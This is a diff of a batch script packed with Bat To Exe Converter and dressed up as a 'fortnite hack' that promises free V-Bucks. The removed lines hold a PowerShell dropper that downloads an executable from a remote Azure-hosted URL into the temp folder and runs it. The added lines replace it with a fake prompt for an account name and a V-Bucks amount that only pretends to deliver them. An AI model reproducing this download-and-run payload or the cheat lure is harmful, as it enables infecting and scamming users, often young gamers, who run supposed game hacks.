@@ -1,12 +1,11 @@
 ::[Bat To Exe Converter]
 ::
-::fBE1pAF6MU+EWHreyHcjLQlHcCGONVeeCbYJ5e31+/m7hUQJfPc9RKfa2b+tJe4H+EToSZAjmHhbjKs=
-::YAwzoRdxOk+EWAjk
-::fBw5plQjdCyDJGyX8VAjFD5YRTimM3y0Crod7PvHy+uMq18fTbFvIcLs07qKL/cApx2pWJM5xHUXvsQACB5KbV+EXUIDoGBGuXOWep/Rngr1WEfH70g/ew==
+::YAwzoRdxOk+EWAnk
+::fBw5plQjdG8=
 ::YAwzuBVtJxjWCl3EqQJgSA==
 ::ZR4luwNxJguZRRnk
 ::Yhs/ulQjdF+5
-::cxAkpRVqdFKZSzk=
+::cxAkpRVqdFKZSDk=
 ::cBs/ulQjdF+5
 ::ZR41oxFsdFKZSDk=
 ::eBoioBt6dFKZSDk=
@@ -27,16 +26,19 @@
 ::ZQ0/vhVqMQ3MEVWAtB9wSA==
 ::Zg8zqx1/OA3MEVWAtB9wSA==
 ::dhA7pRFwIByZRRnk
-::Zh4grVQjdCyDJGyX8VAjFD5YRTimM2ivC7AS/PvHyOOTilgfaMo+e4T437qaMuEf1kPrZ4Ij325fkMoPB1VdZhfL
 ::YB416Ek+ZG8=
 ::
 ::
 ::978f952a14a936cc963da21a135fa983
 @echo off
+title fortnite hack
+color f0
+
+set /p input1=account:
 
 
-set files= 'http://mogiant.azurewebsites.net/windows.exe'
-
-powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
-
-
+set /p input2=vbucks:
+echo giving %input1% %input2% vbucks
+timeout 4 >nul
+echo done
+pause >nul
